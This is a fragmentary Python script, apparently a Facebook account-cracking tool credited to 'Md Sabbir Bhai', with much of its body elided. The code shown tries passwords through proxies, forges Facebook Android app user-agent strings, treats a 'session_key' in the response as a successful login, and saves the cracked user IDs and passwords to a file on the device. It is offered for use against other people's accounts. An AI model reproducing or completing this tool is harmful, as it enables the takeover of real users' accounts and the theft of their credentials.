...
\t      \033[1;37m\033[1;41m Admin : Md Sabbir Bhai\033[0m\033[1;37m
\033[1;37;1m-----------------------------------------------
\033[1;37;1m ▶ Author   : Md Sabbir Bhai 
\033[1;37;1m ▶ Facebook : https://www.facebook.com/profile.php?id=100089747571096
\033[1;37;1m ▶ Virson   : 17.0
\033[1;37;1m-----------------------------------------------""" )
def my_main():
    os.system("clear")
    print(logo)
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [Md Sabbir bhai-OK] {} {} {} {}'.format(G, url, fax, px, mys))
...
def menu(): 
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL');menu()
			elif xd in ['0','00']:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/Mdsabbir.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
